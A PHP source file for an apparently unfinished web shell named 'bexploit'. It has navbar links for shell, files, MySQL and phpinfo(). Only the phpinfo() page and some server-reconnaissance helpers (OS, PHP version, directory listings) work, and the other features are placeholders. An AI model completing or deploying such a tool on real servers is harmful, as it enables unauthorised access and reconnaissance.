<?php

// ALL THE DATA IS STORED IN SESSION ex: Present working directory(PWD) etc
session_start();

//contains to be displayed content
$display = "";

// BEFORE DISPLAYING ANYTHING CHECK IF ITS A FORM REQUEST, LIKE CHANGING DIRECTORY OR COMMAND EXECUTION
checkIncomingFormSubmits();

// CHECK FOR GET/LINK REQUEST ex:php_info link in navbar
checkLinks();


?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title><?php getAppName(); ?></title>


	<!--- BOOTSTRAP BEGINS HERE -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
	<!--- BOOTSTRAP ENDS HERE -->


 </head>
 <body>
 <?php echo getNavBar(getNavBarLinks()); ?>
 	<?php 
	 	if($display) echo $display;
	 	else echo "else";
	 	var_dump($display);
  	?>
 </body>
</html>

<?php

/**
  *
  * ALL FUNCTIONS
  *
  */

function checkIncomingFormSubmits(){
	if(!isPost()) return;
}

function checkLinks(){
	// NO NEED TO GO FURTHER IF ITS NOT A GET REQUEST. ALL THE LINKS ARE GET REQUEST ex: ?request=php_info then DISPLAY PHP_INFO()
	if(!isGet()) return;
	global $display;
 	if(Request('request') === 'php_info') {
 		ob_start(); phpinfo();
 		$display = ob_get_contents();
 		ob_clean();
 		return;
 	}
	if(Request('request') === 'shell') {
		$display = "shell";
		return;
	}
	if(Request('request') === 'files') {
		$display = "files";
		return;
	}
	if(Request('request') === 'mysql') {
		$display = "mysql";
		return;
	}
}

function getPWD(){
	return (isset($_SESSION['pwd']))?$_SESSION['pwd']:getcwd();
}

function getOSDetails(){
	return  php_uname();
}

function getPHPVersion(){
	return phpversion();
}

function getFiles($path){
	$files = [];
	foreach(glob($path.'/*') as $file){
		$files[] = $file;
	}
	return $files;
}

function getAppName(){
	return "bexploit";
}

function Request($varName){
	if(isset($_POST[$varName]))	return $_POST[$varName];
	if(isset($_GET[$varName]))	return $_GET[$varName];
	return false;
}

function isGet(){
	return isset($_GET);
}

function isPost(){
	return isset($_POST);
}

function getNavBarLinks(){
	return ["shell"=>"?request=shell", "Files"=>"?request=files", "MySQL"=>"?request=mysql", "phpinfo()"=>"?request=php_info",];
}

//SET AND GET SESSION

function setSession($key, $val){
	$_SESSION[$key] = $val;
}

function getSession($key){
	return (isset($_SESSION[$key]))?$_SESSION[$key]:false;
}


/**
  *
  * ALL COMPONENTS
  *
  */

function getNavBar($links){
	$li_item = "";
	foreach($links as $name => $href){
		$li_item .= "<li><a href='${href}'>${name}</a></li>";
	}
	return '<nav class="navbar navbar-default">
  <div class="container-fluid">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="">'.getAppName().'</a>
    </div>

    <!-- Collect the nav links, forms, and other content for toggling -->
    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav navbar-right">
        
        '.$li_item.'
        
      </ul>
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>';
}


?>